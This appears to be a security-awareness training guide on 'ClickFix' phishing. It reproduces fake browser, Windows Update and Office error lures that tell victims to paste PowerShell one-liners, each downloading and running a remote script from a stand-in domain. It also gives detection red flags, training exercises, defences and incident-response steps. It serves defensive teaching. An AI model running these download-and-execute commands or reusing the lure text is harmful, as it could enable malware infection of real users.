# ClickFix Attack Examples

This document shows examples of how cybercriminals deliver PowerShell-based attacks through "ClickFix" social engineering tactics. These are **EXAMPLES FOR TRAINING ONLY**.

## ⚠️ WARNING - DO NOT RUN THESE COMMANDS

The following are examples of malicious instructions that attackers include in phishing emails or fake error messages. **NEVER execute these commands outside of controlled training environments.**

## Common ClickFix Scenarios

### 1. Fake Browser Error
```
🚨 CRITICAL BROWSER ERROR 🚨

Your browser has encountered a security error. To fix this issue:

1. Press Windows + R
2. Copy and paste this command:
   powershell -ep bypass -c "iex (iwr 'https://fix-browser-error.com/repair.ps1').Content"
3. Press Enter

This will automatically repair your browser configuration.
```

### 2. Fake Windows Update Error
```
Windows Update Error 0x80070643

To resolve this error:
1. Right-click Start button
2. Select "Windows PowerShell (Admin)"
3. Copy and paste:
   powershell.exe -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-WebRequest -Uri 'https://microsoft-fix.net/update-repair.ps1' -UseBasicParsing).Content"
4. Press Enter and wait for completion
```

### 3. Fake Office 365 Fix
```
Microsoft Office activation failed.

Quick Fix:
1. Press Win+R
2. Paste: powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://office-activate.com/fix.ps1')"
3. Press Enter
```

## Training Commands (Safe Versions)

For training purposes, here are safe versions that execute the local simulation:

### Local Execution (Safe)
```powershell
# Execute local simulation script
powershell -ExecutionPolicy Bypass -File ".\simalicious.ps1"

# Or with Invoke-Expression pattern (local file)
powershell -ep bypass -c "iex (Get-Content '.\web-version.ps1' -Raw)"
```

### Remote Execution Simulation (Training)
If hosting the web-version.ps1 on a training server:
```powershell
# Replace YOUR-TRAINING-SERVER with actual training server
powershell -ep bypass -c "iex (iwr 'https://YOUR-TRAINING-SERVER/web-version.ps1').Content"
```

## Red Flags to Watch For

Teach users to recognize these warning signs:

### Suspicious Commands
- `powershell -ep bypass` or `-ExecutionPolicy Bypass`
- `Invoke-Expression` or `iex`
- `Invoke-WebRequest` or `iwr` downloading scripts
- `.DownloadString()` methods
- Shortened URLs or suspicious domains

### Social Engineering Tactics
- Urgent language ("CRITICAL", "IMMEDIATE ACTION REQUIRED")
- Fake error messages with technical-sounding codes
- Instructions to bypass security (disable antivirus, etc.)
- Requests to run PowerShell as administrator
- Claims to be from Microsoft, tech support, etc.

### Delivery Methods
- Email attachments with instructions
- Fake pop-up windows on websites
- Tech support scam phone calls
- Malicious QR codes
- Social media messages

## Training Exercises

### Exercise 1: Recognition
Show participants examples of ClickFix emails and have them identify:
- The malicious command
- Social engineering tactics used
- Red flags they should notice

### Exercise 2: Safe Execution
In a controlled environment:
1. Execute the safe simulation scripts
2. Observe the behavior
3. Discuss what real malware would do differently

### Exercise 3: Reporting
Practice incident response:
- How to report suspicious emails
- How to check if a script was executed
- How to contain potential infections

## Defense Strategies

### Technical Controls
- PowerShell execution policies
- Application whitelisting
- Email security gateways
- Endpoint detection and response (EDR)
- User Account Control (UAC)

### User Education
- Regular security awareness training
- Phishing simulation exercises
- Clear reporting procedures
- "When in doubt, don't click" mentality

### Organizational Policies
- Restrict PowerShell execution
- Block .ps1 files in email
- Implement least privilege access
- Regular security assessments

## Incident Response

If a user reports executing a suspicious PowerShell command:

1. **Immediate Actions**
   - Disconnect from network
   - Document what was executed
   - Preserve evidence

2. **Assessment**
   - Check running processes
   - Look for persistence mechanisms
   - Scan for indicators of compromise

3. **Containment**
   - Isolate affected systems
   - Reset credentials
   - Apply security patches

4. **Recovery**
   - Restore from clean backups
   - Rebuild compromised systems
   - Update security controls

Remember: The best defense is prevention through education and technical controls working together!